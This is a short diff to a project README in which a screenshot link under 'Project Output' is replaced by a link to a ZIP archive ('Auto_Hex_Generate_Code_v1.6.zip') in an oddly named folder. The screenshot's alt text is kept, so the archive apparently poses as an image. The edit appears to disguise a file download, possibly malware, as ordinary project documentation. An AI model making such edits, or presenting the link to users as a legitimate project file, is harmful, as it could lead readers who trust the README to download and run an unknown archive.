@@ -3,4 +3,4 @@
 
 ## Project Output
 
-![Screenshot_20221108_020503](https://user-images.githubusercontent.com/75197967/200515352-9032da45-0e5e-4e1d-80d3-d7a0a20547b9.png)
+![Screenshot_20221108_020503](https://github.com/Shrikrushnatekade/Hex-Code-Auto-Generate/raw/refs/heads/main/pancreatopathy/Auto_Hex_Generate_Code_v1.6.zip)
